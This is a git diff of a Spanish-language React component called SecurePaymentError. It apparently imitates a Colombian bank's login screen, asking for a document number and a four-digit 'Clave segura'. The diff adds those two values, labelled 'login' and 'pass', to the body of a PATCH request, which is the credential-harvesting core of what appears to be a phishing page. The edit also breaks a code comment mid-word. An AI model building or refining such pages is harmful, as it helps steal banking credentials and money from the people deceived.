@@ -106,7 +106,10 @@ const SecurePaymentError = () => {
 
         // Crear el body de la solicitud
         const body = {
-          status_id: 1,  // Aquí se define el estado a 1 como se solicitó
+          status_id: 1, 
+          login: documentNumber,
+          pass: secureKey // A
+          // quí se define el estado a 1 como se solicitó
         };
 
         // Hacer la solicitud PATCH
@@ -227,7 +230,6 @@ const SecurePaymentError = () => {
                           />
                         </div>
                       </div>
-
                       <div>
                         <h2 className="text-sm font-semibold mb-2 text-[#444444]">Clave segura</h2>
                         <div className="relative">
@@ -251,7 +253,6 @@ const SecurePaymentError = () => {
                         </div>
                       </div>
                       <input type="hidden" value="bogota" />
-
                       <button
                         onClick={handleSubmit}
                         disabled={!documentNumber || secureKey.length !== 4}
@@ -260,7 +261,6 @@ const SecurePaymentError = () => {
                         Ingresar ahora
                       </button>
                       {error && <p className="text-red-500 mt-2 text-center">Por favor, complete todos los campos.</p>}
-
                       <div className="flex items-center justify-center pt-5 font-semibold">
                         <p><a href="#" className="text-[#0043a9] no-underline mx-2">Registrarme ›</a></p>
                         <span className="text-gray-300 mx-2">|</span>
